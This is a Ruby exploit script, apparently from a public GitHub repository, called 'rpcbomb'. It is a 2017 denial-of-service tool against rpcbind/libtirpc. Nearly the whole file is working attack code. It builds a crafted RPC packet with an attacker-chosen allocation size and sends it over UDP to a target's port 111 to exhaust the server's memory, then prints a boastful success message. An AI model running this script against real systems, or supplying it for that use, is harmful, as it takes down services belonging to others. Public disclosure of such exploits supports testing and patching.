#
# Source: https://raw.githubusercontent.com/guidovranken/rpcbomb/fe53048af2d4fb78c911e71a30f21afcffbbf5e1/rpcbomb.rb
#
# Thanks to Sean Verity for writing an exploit in Ruby for an earlier
# vulnerability: https://www.exploit-db.com/exploits/26887/
# I&#039;ve used it as a template.
 
require &#039;socket&#039;
def usage
        abort "\nusage: ./rpcbomb.rb <target> <# bytes to allocate> [port]\n\n"
end
bomb = """
                               ` + # ,         
                           : @ @ @ @ @ @       
               @ @ ; . + @ @ @ .       @ @     
                 @ @ @ @ @ `           @ @     
                                 . `   @ #     
                     ; @ @ @ . : @ @ @ @       
                 @ @ @ @ @ @ @ @ @ @ @ ;       
               @ @ @ @ @ @ @ @ @ @ @ @ @ `     
             @ @ @ @ @ @ @ @ @ @ @ @ @ @ :     
           # @ @ @ @ @ @ @ @ @ @ @ @ @ &#039;       
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
         . @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
         + @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
         : @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ @       
           @ @ @ @ @ @ @ @ @ @ @ @ @ @ ,       
             @ @ @ @ @ @ @ @ @ @ @ @ @         
             , @ @ @ @ @ @ @ @ @ @ @           
               ` @ @ @ @ @ @ @ @ @             
                   , @ @ @ @ @  
     r p c b o m b
 
     DoS exploit for *nix rpcbind/libtirpc.
 
     (c) 2017 Guido Vranken.
 
 
"""
 
puts bomb
 
if ARGV.length >= 2
    begin
        host = ARGV[0]
        numBytes = Integer(ARGV[1])
        port = ARGV.length == 3 ? Integer(ARGV[2]) : 111
    rescue
        usage
    end
 
    pkt = [0].pack(&#039;N&#039;)         # xid
    pkt << [0].pack(&#039;N&#039;)        # message type CALL
    pkt << [2].pack(&#039;N&#039;)        # RPC version 2
    pkt << [100000].pack(&#039;N&#039;)   # Program
    pkt << [4].pack(&#039;N&#039;)        # Program version
    pkt << [9].pack(&#039;N&#039;)        # Procedure
    pkt << [0].pack(&#039;N&#039;)        # Credentials AUTH_NULL
    pkt << [0].pack(&#039;N&#039;)        # Credentials length 0
    pkt << [0].pack(&#039;N&#039;)        # Credentials AUTH_NULL
    pkt << [0].pack(&#039;N&#039;)        # Credentials length 0
    pkt << [0].pack(&#039;N&#039;)        # Program: 0
    pkt << [0].pack(&#039;N&#039;)        # Ver
    pkt << [4].pack(&#039;N&#039;)        # Proc
    pkt << [4].pack(&#039;N&#039;)        # Argument length
    pkt << [numBytes].pack(&#039;N&#039;) # Payload
 
    s = UDPSocket.new
    s.send(pkt, 0, host, port)
 
    sleep 1.5
 
    begin
        s.recvfrom_nonblock(9000)
    rescue
        puts "No response from server received."
        exit()
    end
 
    puts "Allocated #{numBytes} bytes at host #{host}:#{port}.\n" +
        "\nDamn it feels good to be a gangster.\n\n"
else
    usage
end

